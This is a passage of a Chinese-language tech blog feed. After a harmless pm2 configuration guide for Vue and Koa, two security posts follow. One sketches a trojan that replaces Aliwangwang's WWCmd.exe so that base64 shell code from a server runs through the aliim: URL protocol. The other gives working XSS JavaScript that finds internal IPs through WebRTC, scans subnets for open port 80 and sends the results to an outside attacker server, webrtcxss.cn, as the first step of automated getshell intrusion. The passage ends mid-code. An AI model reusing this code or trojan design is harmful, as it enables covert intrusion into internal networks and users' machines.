class="line">plt.scatter(x,y)</div></pre></td></tr></table></figure><h5 id="饼状图"><a href="#饼状图" class="headerlink" title="饼状图"></a>饼状图</h5><p><img src="http://on7r0tqgu.bkt.clouddn.com/FrXBC3oqO9Jv-K-2SFlTy3EKAv7z.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Numpy-amp-Pandas-amp-Matplotilb部分API操作&quot;&gt;&lt;a href=&quot;#Numpy-amp-Pandas-amp-Matplotilb部分API操作&quot; class=&quot;headerlink&quot; title=&quot;Numpy &amp;amp; Pand
      
    
    </summary>
    
    
      <category term="Python" scheme="http://bugs.cc/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>基于Vue+Koa的pm2配置</title>
    <link href="http://bugs.cc/2017/11/07/%E5%9F%BA%E4%BA%8EVue+Koa%E7%9A%84pm2%E9%85%8D%E7%BD%AE/"/>
    <id>http://bugs.cc/2017/11/07/基于Vue+Koa的pm2配置/</id>
    <published>2017-11-07T13:37:00.000Z</published>
    <updated>2017-11-07T13:39:18.667Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h2><p>目前使用的技术栈是：前端Vue、后端Koa、数据库Mongodb。</p><p>然而每当起服务的时候，都要<code>npm start</code>、<code>node ./server/app.js</code>，还要同时保持这两个窗口一直是开着的，很是麻烦。</p><p>而且因为我使用的是koa，也没有使用狼叔写的koa脚手架。是自己基于廖雪峰老师的<a href="https://www.liaoxuefeng.com/wiki/001434446689867b27157e896e74d51a89c25cc8b43bdb3000/001434501579966ab03decb0dd246e1a6799dd653a15e1b000" target="_blank" rel="external">Koa框架</a> 改的一个小型mvc。导致没有热更新。</p><p>为了简化这种没必要的操作及增加热更新，开始想怎么进行优化。于是选择了<code>pm2</code><br><a id="more"></a></p><h2 id="配置pm2"><a href="#配置pm2" class="headerlink" title="配置pm2"></a>配置pm2</h2><p>先安装pm2：<code>npm i pm2</code>、<code>npm i pm2 -g</code><br>因为是开源项目，为了让代码能再别人的电脑上跑起来，需要让pm2存在项目里。然后在全局安装，方便后期调试</p><p>再项目的根目录里创建logs目录</p><p>在当前的目录创建一个pm2.json的文件，内容如下：<br><figure class="highlight json"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">  <span class="attr">"apps"</span>: [&#123;</div><div class="line">    <span class="attr">"name"</span>: <span class="string">"koler-server"</span>,</div><div class="line">    <span class="attr">"script"</span>: <span class="string">"./app.js"</span>,</div><div class="line">    <span class="attr">"error_file"</span>      : <span class="string">"../logs/server-err.log"</span>,</div><div class="line">    <span class="attr">"out_file"</span>        : <span class="string">"../logs/server-out.log"</span>,</div><div class="line">    <span class="attr">"merge_logs"</span>      : <span class="literal">true</span>,</div><div class="line">    <span class="attr">"log_date_format"</span> : <span class="string">"YYYY-MM-DD HH:mm Z"</span>,</div><div class="line">    <span class="attr">"cwd"</span>: <span class="string">"./server"</span>,</div><div class="line">    <span class="attr">"watch"</span>: [</div><div class="line">      <span class="string">"app.js"</span>,</div><div class="line">      <span class="string">"controllers"</span></div><div class="line">    ],</div><div class="line">    <span class="attr">"watch_options"</span>: &#123;</div><div class="line">      <span class="attr">"followSymlinks"</span>: <span class="literal">false</span></div><div class="line">    &#125;</div><div class="line">  &#125;,&#123;</div><div class="line">    <span class="attr">"name"</span>: <span class="string">"koler-app"</span>,</div><div class="line">    <span class="attr">"script"</span>: <span class="string">"./build/dev-server.js"</span>,</div><div class="line">    <span class="attr">"error_file"</span>      : <span class="string">"./logs/app-err.log"</span>,</div><div class="line">    <span class="attr">"out_file"</span>        : <span class="string">"./logs/app-out.log"</span>,</div><div class="line">    <span class="attr">"merge_logs"</span>      : <span class="literal">true</span>,</div><div class="line">    <span class="attr">"log_date_format"</span> : <span class="string">"YYYY-MM-DD HH:mm Z"</span>,</div><div class="line">    <span class="attr">"cwd"</span>: <span class="string">"./"</span>,</div><div class="line">    <span class="attr">"ignore_watch"</span> : [</div><div class="line">      <span class="string">"node_modules"</span></div><div class="line">    ],</div><div class="line">    <span class="attr">"watch_options"</span>: &#123;</div><div class="line">      <span class="attr">"followSymlinks"</span>: <span class="literal">false</span></div><div class="line">    &#125;</div><div class="line">  &#125;]</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>这里同时启动两个项目。<br><code>koler-server</code>是koa，<code>koler-app</code>是前端vue。</p><p>我尝试了一下把<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">"error_file"      : "./logs/app-err.log",</div><div class="line">"out_file"        : "./logs/app-out.log",</div><div class="line">"merge_logs"      : true,</div><div class="line">"log_date_format" : "YYYY-MM-DD HH:mm Z",</div></pre></td></tr></table></figure></p><p>代码提升到json的根部，但是发现不起作用。看来pm2不支持这种。所以只能在每个服务里写了。</p><h2 id="配置package-json"><a href="#配置package-json" class="headerlink" title="配置package.json"></a>配置package.json</h2><p>替换之前的<code>script</code>字段下的<code>dev</code>，然后再增加<code>stop</code>字段，替换后如下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">"scripts": &#123;</div><div class="line">  "dev": "pm2 start pm2.json &amp;&amp; pm2 logs",</div><div class="line">  "start": "npm run dev",</div><div class="line">  "stop": "pm2 stop koler-app koler-server &amp;&amp; pm2 delete koler-app koler-server",</div><div class="line">  "build": "node build/build.js",</div><div class="line">  "lint": "eslint --ext .js,.vue src"</div><div class="line">&#125;,</div></pre></td></tr></table></figure><p><code>pm2 start pm2.json &amp;&amp; pm2 logs</code>是基于pm2.json文件配置启动，后面的<code>pm2 logs</code>是为了同时跟踪vue和koa的反馈日志。</p><p>输入<code>npm start</code>后。终端如下：</p><p><img src="http://on7r0tqgu.bkt.clouddn.com/FpdV0O2rb4f3tD92T5YyITvN08IW.png" alt="images"></p><p>那个错误是不用管的，因为我忘记清理之前的日志了</p><p>启动后，你的屏幕会出现一个cmd窗口，不用关，过一会它会自行关闭的。每次修改代码触发pm2配置文件里<code>watch</code>规则时，就会自动弹出一个cmd窗口，也是过一会关闭。</p><p>因为其他项目使用者可能会在电脑上跑多个pm2实例，所以在<code>stop</code>字段里，我跟上了名字。防止出现把所有的实例全部暂定删除了。</p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>现在我们更改代码发现没有任何问题，pm2会帮助我们自动进行热更新。现在我们故意改错一段vue的代码试试：</p><p><img src="http://on7r0tqgu.bkt.clouddn.com/Fmu-PQFket7CUThOPfyRcRfY81nq.png" alt="images"></p><p><img src="http://on7r0tqgu.bkt.clouddn.com/FnndHDzmULqERjxSj0udoEzLanwR.png" alt="images"></p><p>可以发现已经OK了。</p><p>这里说明一下为什么在pm2.json配置文件里的第二个实例<code>koler-app</code>没有watch，因为vue在开发环境下使用的是wenpack的watch，所以不需要加。</p><blockquote><p>Author：Black-Hole<br>Email：158blackhole@gmail.com<br>Blog：<a href="http://bugs.cc">http://bugs.cc</a><br>WeiBo：<a href="http://weibo.com/comelove" target="_blank" rel="external">http://weibo.com/comelove</a><br>Twitter：<a href="https://twitter.com/Free_BlackHole" target="_blank" rel="external">https://twitter.com/Free_BlackHole</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;背景介绍&quot;&gt;&lt;a href=&quot;#背景介绍&quot; class=&quot;headerlink&quot; title=&quot;背景介绍&quot;&gt;&lt;/a&gt;背景介绍&lt;/h2&gt;&lt;p&gt;目前使用的技术栈是：前端Vue、后端Koa、数据库Mongodb。&lt;/p&gt;
&lt;p&gt;然而每当起服务的时候，都要&lt;code&gt;npm start&lt;/code&gt;、&lt;code&gt;node ./server/app.js&lt;/code&gt;，还要同时保持这两个窗口一直是开着的，很是麻烦。&lt;/p&gt;
&lt;p&gt;而且因为我使用的是koa，也没有使用狼叔写的koa脚手架。是自己基于廖雪峰老师的&lt;a href=&quot;https://www.liaoxuefeng.com/wiki/001434446689867b27157e896e74d51a89c25cc8b43bdb3000/001434501579966ab03decb0dd246e1a6799dd653a15e1b000&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Koa框架&lt;/a&gt; 改的一个小型mvc。导致没有热更新。&lt;/p&gt;
&lt;p&gt;为了简化这种没必要的操作及增加热更新，开始想怎么进行优化。于是选择了&lt;code&gt;pm2&lt;/code&gt;&lt;br&gt;
    
    </summary>
    
    
      <category term="NodeJs" scheme="http://bugs.cc/tags/NodeJs/"/>
    
      <category term="Vue" scheme="http://bugs.cc/tags/Vue/"/>
    
      <category term="Koa" scheme="http://bugs.cc/tags/Koa/"/>
    
  </entry>
  
  <entry>
    <title>基于URLProtocol攻击的一些想法</title>
    <link href="http://bugs.cc/2017/03/26/%E5%9F%BA%E4%BA%8EURLProtocol%E6%94%BB%E5%87%BB%E7%9A%84%E4%B8%80%E4%BA%9B%E6%83%B3%E6%B3%95/"/>
    <id>http://bugs.cc/2017/03/26/基于URLProtocol攻击的一些想法/</id>
    <published>2017-03-26T08:33:52.000Z</published>
    <updated>2017-03-26T08:34:42.000Z</updated>
    
    <content type="html"><![CDATA[<p>浏览器调起本地应用的原理是<code>URLProtocol</code>技术，详情可以在</p><ol><li><a href="http://www.cnblogs.com/wang726zq/archive/2012/12/11/UrlProtocol.html" target="_blank" rel="external">http://www.cnblogs.com/wang726zq/archive/2012/12/11/UrlProtocol.html</a></li><li><a href="http://blog.csdn.net/zssureqh/article/details/25828683" target="_blank" rel="external">http://blog.csdn.net/zssureqh/article/details/25828683</a></li></ol><p>里查看。</p><p>其中 在注册表的 <code>[HKEY_CLASSES_ROOT]</code>主键下，我们可以看到很多的<code>URLProtocol</code>。<br><a id="more"></a><br>比如阿里旺旺的：</p><p><img src="http://on7r0tqgu.bkt.clouddn.com/Fi_2w3-zHnbp-WB6W0lJlMxkNsmN.png" alt=""></p><p>而阿里旺旺在网页端的<code>和我联系</code>按钮，是跳转到<code>https://amos.alicdn.com/getcid.aw?v=3&amp;groupid=0&amp;s=1&amp;charset=utf-8&amp;uid=淘宝店铺名&amp;site=cntaobao&amp;groupid=0&amp;s=1&amp;fromid=cntaobao淘宝用户名</code>链接的，而这个页面调用了下面的javascript代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">!<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> a = <span class="built_in">window</span>,</div><div class="line">    b = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            <span class="built_in">window</span>.open(<span class="string">""</span>, <span class="string">"_top"</span>),</div><div class="line">            a.opener = <span class="literal">null</span>,</div><div class="line">            a.close()</div><div class="line">        &#125; <span class="keyword">catch</span>(b) &#123;&#125;</div><div class="line">    &#125;,</div><div class="line">    c = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">        a.location.href = <span class="string">"aliim:sendmsg?touid="</span> + a.site + a.touid + <span class="string">"&amp;site="</span> + a.site + <span class="string">"&amp;status=1"</span>,</div><div class="line">        setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">            b()</div><div class="line">        &#125;,</div><div class="line">        <span class="number">6e3</span>)</div><div class="line">    &#125;;</div><div class="line">    a.isInstalled ? a.isInstalled(<span class="function"><span class="keyword">function</span>(<span class="params">b</span>) </span>&#123;</div><div class="line">        <span class="keyword">if</span> (b) c();</div><div class="line">        <span class="keyword">else</span> &#123;</div><div class="line">            <span class="keyword">var</span> d = confirm(<span class="string">"\u68c0\u6d4b\u5230\u4f60\u672a\u5b89\u88c5\u963f\u91cc\u65fa\u65fa\u5ba2\u6237\u7aef,\u662f\u5426\u8981\u8df3\u8f6c\u5230\u5b98\u7f51\u4e0b\u8f7d?"</span>);</div><div class="line">            d === !<span class="number">0</span> &amp;&amp; (a.location.href = <span class="string">"https://wangwang.taobao.com"</span>)</div><div class="line">        &#125;</div><div class="line">    &#125;) : c()</div><div class="line">&#125; ();</div></pre></td></tr></table></figure><p>其中最核心的代码就是<code>a.location.href = &quot;aliim:sendmsg?touid=&quot; + a.site + a.touid + &quot;&amp;site=&quot; + a.site + &quot;&amp;status=1&quot;</code>代码，而这段代码的aliim就是在注册表的 <code>[HKEY_CLASSES_ROOT]</code>主键下的阿里旺旺主键名。</p><p>在上面的图中，我们可以看到当打开时，调用了<code>&quot;D:\Program Files (x86)\AliWangWang\8.60.03C\wwcmd.exe&quot; %1</code>命令，wwcmd.exe就是阿里旺旺处理网页端信息的API接口，当处理成功时，就会调起回话窗口。%1就是<code>sendmsg?touid=&quot; + a.site + a.touid + &quot;&amp;site=&quot; + a.site + &quot;&amp;status=1&quot;</code>这段参数。让我们替换下WWCmd.exe。看下是如何传递参数的：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span> </span>&#123;</div><div class="line">     FILE *fp = fopen(<span class="string">"c:/123.txt"</span>,<span class="string">"w+"</span>);</div><div class="line">     <span class="keyword">if</span>(<span class="literal">NULL</span> == fp)</div><div class="line">         <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">     <span class="keyword">while</span>(argc--&gt;<span class="number">0</span>)&#123;</div><div class="line">         <span class="built_in">fputs</span>(*++argv,fp);</div><div class="line">         <span class="built_in">fputs</span>(<span class="string">" "</span>,fp);</div><div class="line">     &#125;</div><div class="line">     <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line"> &#125;</div></pre></td></tr></table></figure><p>这段C语言代码是会把后面的参数另存为c盘下的123.txt文件，替换掉WWCmd.exe后，点击<code>和我联系</code>，C盘下存在了一个123.txt文件</p><p><img src="http://on7r0tqgu.bkt.clouddn.com/FvRZnSDiZhAqgGzlDKf-Lre-Gbmo.png" alt=""></p><p>发现，把<code>aliim:</code>也传递进去了，按照这个请求的话，我们可以构造一个exe程序，来进行接收参数了。个人能力有限，说说大体的思路吧。</p><p>exe程序替换掉原有的<code>WWCmd.exe</code>程序，然后来生成特定的插件，植入到浏览器里，然后用户每打开一个网站都会从服务器端接收一个特定的base64编码后的shell代码。然后执行<code>aliim:cmd=服务端的base64</code>，然后运行。当参数为<code>sendmsg</code>时，调起阿里旺旺，当为<code>cmd</code>时执行代码。这样的话，木马的隐藏及唤醒条件都达到了。同理迅雷下载等也都可以。</p><p>好处是在哪呢，一般来说浏览器调起阿里旺旺、迅雷等应用都会弹窗，但是一般用户都会点击 不在提示。这样的话，目标就打成了。</p><p>这只是一个思路，不太成熟。欢迎大家补充。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;浏览器调起本地应用的原理是&lt;code&gt;URLProtocol&lt;/code&gt;技术，详情可以在&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;http://www.cnblogs.com/wang726zq/archive/2012/12/11/UrlProtocol.html&quot;&gt;http://www.cnblogs.com/wang726zq/archive/2012/12/11/UrlProtocol.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://blog.csdn.net/zssureqh/article/details/25828683&quot;&gt;http://blog.csdn.net/zssureqh/article/details/25828683&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;里查看。&lt;/p&gt;
&lt;p&gt;其中 在注册表的 &lt;code&gt;[HKEY_CLASSES_ROOT]&lt;/code&gt;主键下，我们可以看到很多的&lt;code&gt;URLProtocol&lt;/code&gt;。&lt;br&gt;
    
    </summary>
    
    
      <category term="安全" scheme="http://bugs.cc/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>浏览器插件的攻击向量</title>
    <link href="http://bugs.cc/2016/12/14/XSS%E8%87%AA%E5%8A%A8%E5%8C%96%E5%85%A5%E4%BE%B5%E5%86%85%E7%BD%91/"/>
    <id>http://bugs.cc/2016/12/14/XSS自动化入侵内网/</id>
    <published>2016-12-14T14:40:25.000Z</published>
    <updated>2016-12-15T03:37:31.354Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h3 id="0x01-前言："><a href="#0x01-前言：" class="headerlink" title="0x01 前言："></a>0x01 前言：</h3></blockquote><p>很多人都认为XSS只能做盗取cookies的活。以至于有些SRC、厂商对待反射型XSS视而不见，或者说是根本不重视。</p><p>直到“黑哥”在之前的演讲中提到XSS入侵内网，情况才得以好转。但是经过本人测试，黑哥所说的XSS内网入侵，应该是包含了浏览器漏洞。那没有浏览器漏洞该如何呢？就像0x_Jin之前在乌云报道的搜狐漏洞那样：<a href="http://www.wooyun.org/bugs/wooyun-2014-076685" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2014-076685</a></p><p>这里有几个需要注意的地方：由于浏览器的同源策略问题导致没有办法做到真正意义上的内网入侵，当然如果你又浏览器的0day，那事情就另当别论了。</p><p>而0x_Jin在乌云中的那篇漏洞报告，我自己本人也去问了。答复就是只是检测了开放的80端口，就没有后续了。黑哥没有公布完整的代码，0x_Jin没有深入。既然都没有，就交给我吧。这里我将会使用其他办法“绕过浏览器的同源策略”。</p><blockquote><h3 id="0x02构架："><a href="#0x02构架：" class="headerlink" title="0x02构架："></a>0x02构架：</h3></blockquote><p>代码采用了类似XSS平台那种实时反馈机制。在这里我先把变量介绍一遍：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> onlyString           = <span class="string">"abc"</span>;</div><div class="line"><span class="keyword">var</span> ipList               = [];</div><div class="line"><span class="keyword">var</span> survivalIpLIst       = [];</div><div class="line"><span class="keyword">var</span> deathIpLIst          = [];</div><div class="line"><span class="keyword">var</span> sendsurvivalIp       = <span class="string">"http://webrtcxss.cn/Api/survivalIp"</span>;</div><div class="line"><span class="keyword">var</span> snedIteratesIpUrl    = <span class="string">"http://webrtcxss.cn/Api/survivalPortIp"</span>;</div><div class="line"><span class="keyword">var</span> snedIteratesCmsIpUrl = <span class="string">"http://webrtcxss.cn/Api/survivalCmsIp"</span>;</div><div class="line"><span class="keyword">var</span> sendExistenceVul     = <span class="string">"http://webrtcxss.cn/Api/existenceVul"</span>;</div></pre></td></tr></table></figure></p><a id="more"></a><ol><li><p>onlyString ： 唯一字符串，用于让服务器识别当前发送的请求是哪一个项目，真实代码是不会写成abc的，会使用md5(date(‘Y-m-d H:i:s’))来生成hash。</p></li><li><p>ipList ： 数组变量用来储存webrtc获取的内网IP地址。</p></li><li><p>survivalIpLIst ： 数组对象用于存放开放80端口的IP地址</p></li><li><p>deathIpLIst ： 数组对象用于存放不存在80端口的IP，用于判断</p></li><li><p>sendsurvivalIp ： 发送当前内网IP的信息到服务端</p></li><li><p>snedIteratesIpUrl ： 从服务端反馈的cms路径对当前存在80端口的IP进行判断，看现有存活的IP地址是否可以在服务端里找到所匹配的CMS信息</p></li><li>snedIteratesCmsIpUrl ： 用于在已匹配到的cms信息里，从服务端里验证这个cms是否存在我们在服务端里所保存的getshell漏洞</li><li>sendExistenceVul ： 已确定漏洞，发送到服务端</li></ol><p>之前在0x01前言里说到，这里我将会使用其他办法“绕过浏览器的同源策略”。现在我就来说说如何构架、整段代码的构架把：</p><p>WebRTC获取到内网IP-&gt;遍历内网存在80端口的IP地址-&gt;检测开放80端口IP属于哪一种CMS类型-&gt;利用getshell生成js文件-&gt;是否存在js文件-&gt;存在JS文件-&gt;发送到服务端，漏洞存在-&gt;</p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/1.png" alt=""></p><p>-&gt;不存在JS文件-&gt;漏洞不存在，结束。<br>详情请移步到：<a href="https://www.processon.com/view/link/5711cdc6e4b0d7e7748c34ec" target="_blank" rel="external">https://www.processon.com/view/link/5711cdc6e4b0d7e7748c34ec</a></p><blockquote><h3 id="0x03获取内网的IP信息："><a href="#0x03获取内网的IP信息：" class="headerlink" title="0x03获取内网的IP信息："></a>0x03获取内网的IP信息：</h3></blockquote><p>详情请移步到：<a href="https://webrtc.org/faq/#what-is-webrtc" target="_blank" rel="external">https://webrtc.org/faq/#what-is-webrtc</a><br>因为WebRTC让JavaScript具有了一定的底层操作方法，而由于WebRTC的特殊性，让我们可以使用JavaScript来获取到内网IP。目前WebRTC支持的平台有：Chrome、Firefox、Opera、Android、IOS。实际测试的时候maxthon也是支持的（此处有伏笔）。<br>WebRTC获取内网IP这段代码网上是可以找到的，而在这里需要修改一下。方便其他代码容易调用。<br>然后就是webrtc的代码了：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> webrtcxss = &#123;</div><div class="line">    <span class="attr">webrtc</span> : <span class="function"><span class="keyword">function</span>(<span class="params">callback</span>)</span>&#123;</div><div class="line">        <span class="keyword">var</span> ip_dups           = &#123;&#125;;</div><div class="line">        <span class="keyword">var</span> RTCPeerConnection = <span class="built_in">window</span>.RTCPeerConnection || <span class="built_in">window</span>.mozRTCPeerConnection || <span class="built_in">window</span>.webkitRTCPeerConnection;</div><div class="line">        <span class="keyword">var</span> mediaConstraints  = &#123;</div><div class="line">            <span class="attr">optional</span>: [&#123;<span class="attr">RtpDataChannels</span>: <span class="literal">true</span>&#125;]</div><div class="line">        &#125;;</div><div class="line">        <span class="keyword">var</span> servers = <span class="literal">undefined</span>;</div><div class="line">        <span class="keyword">if</span>(<span class="built_in">window</span>.webkitRTCPeerConnection)&#123;</div><div class="line">            servers = &#123;<span class="attr">iceServers</span>: []&#125;;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">var</span> pc = <span class="keyword">new</span> RTCPeerConnection(servers, mediaConstraints);</div><div class="line">        pc.onicecandidate = <span class="function"><span class="keyword">function</span>(<span class="params">ice</span>)</span>&#123;</div><div class="line">            <span class="keyword">if</span>(ice.candidate)&#123;</div><div class="line">                <span class="keyword">var</span> ip_regex        = <span class="regexp">/([0-9]&#123;1,3&#125;(\.[0-9]&#123;1,3&#125;)&#123;3&#125;)/</span>;</div><div class="line">                <span class="keyword">var</span> ip_addr         = ip_regex.exec(ice.candidate.candidate)[<span class="number">1</span>];</div><div class="line">                <span class="keyword">if</span>(ip_dups[ip_addr] === <span class="literal">undefined</span>)</div><div class="line">                callback(ip_addr);</div><div class="line">                ip_dups[ip_addr] = <span class="literal">true</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;;</div><div class="line">        pc.createDataChannel(<span class="string">""</span>);</div><div class="line">        pc.createOffer(<span class="function"><span class="keyword">function</span>(<span class="params">result</span>)</span>&#123;</div><div class="line">            pc.setLocalDescription(result, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;);</div><div class="line">        &#125;);</div><div class="line">    &#125;,</div><div class="line">    <span class="attr">getIp</span> : <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">        <span class="keyword">this</span>.webrtc(<span class="function"><span class="keyword">function</span>(<span class="params">ip</span>)</span>&#123;</div><div class="line">            ipList.push(ip);</div><div class="line">        &#125;);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">webrtcxss.getIp();</div></pre></td></tr></table></figure></p><p>现在我们来打印一下看看：</p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/2.png" alt=""></p><p>已经获取到了我当前主机的IP地址了。</p><blockquote><h3 id="0x04检测内网中开启了80端口的IP："><a href="#0x04检测内网中开启了80端口的IP：" class="headerlink" title="0x04检测内网中开启了80端口的IP："></a>0x04检测内网中开启了80端口的IP：</h3></blockquote><p>上一节的结尾可以看到<code>webrtcxss.getIp()</code>;已经调用了WebRTC来获取到内网的IP信息，IP保存在ipList数组变量里。这里就要检测内网中所有开放80端口的IP了。这里我写了一个函数来把这一步放到函数里：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">iteratesIp</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    stage(<span class="number">1</span>)</div><div class="line">    ipAjax = <span class="keyword">new</span> XMLHttpRequest();</div><div class="line">    ipAjax.open(<span class="string">'POST'</span>, sendsurvivalIp, <span class="literal">false</span>);</div><div class="line">    ipAjax.setRequestHeader(<span class="string">"Content-type"</span>,<span class="string">"application/x-www-form-urlencoded"</span>);</div><div class="line">    ipAjax.send(<span class="string">'survivalip='</span>+ ipList.join(<span class="string">"-"</span>) + <span class="string">'&amp;onlystring='</span> + onlyString);</div><div class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; ipList.length;i++)&#123;</div><div class="line">        incompleteIp = ipList[i].split(<span class="string">"."</span>);</div><div class="line">        incompleteIp.pop();</div><div class="line">        incompleteIp = incompleteIp.join(<span class="string">"."</span>);</div><div class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">1</span>;j &lt; <span class="number">255</span>;j++)&#123;</div><div class="line">            <span class="keyword">var</span> ip = incompleteIp + <span class="string">"."</span> + j;</div><div class="line">            <span class="keyword">var</span> imgTag = <span class="built_in">document</span>.createElement(<span class="string">"img"</span>);</div><div class="line">            imgTag.setAttribute(<span class="string">"src"</span>,<span class="string">"http://"</span> + ip + <span class="string">"/favicon.ico"</span>);</div><div class="line">            imgTag.setAttribute(<span class="string">"onerror"</span>,<span class="string">"javascript:deathIpLIst.push('"</span>+ip+<span class="string">"')"</span>);</div><div class="line">            imgTag.setAttribute(<span class="string">"onload"</span>,<span class="string">"javascript:survivalIpLIst.push('"</span>+ip+<span class="string">"')"</span>);</div><div class="line">            imgTag.setAttribute(<span class="string">"style"</span>,<span class="string">"display:none;"</span>);</div><div class="line">            <span class="built_in">document</span>.getElementsByTagName(<span class="string">"body"</span>)[<span class="number">0</span>].appendChild(imgTag);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">setTimeout(<span class="string">"iteratesIp()"</span>,<span class="number">20000</span>);</div><div class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="keyword">if</span>(deathIpLIst.length + survivalIpLIst.length == <span class="number">254</span>)&#123;</div><div class="line">        snedIteratesIpData(survivalIpLIst);</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        setTimeout(<span class="built_in">arguments</span>.callee,<span class="number">5000</span>);</div><div class="line">    &#125;</div><div class="line">&#125;)();</div></pre></td></tr></table></figure></p><p>至于其中的<code>stage(1)</code>是我自己写的一个函数，用于实时向服务端发送当前最新的运行情况，我们放到最后再说。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">ipAjax = <span class="keyword">new</span> 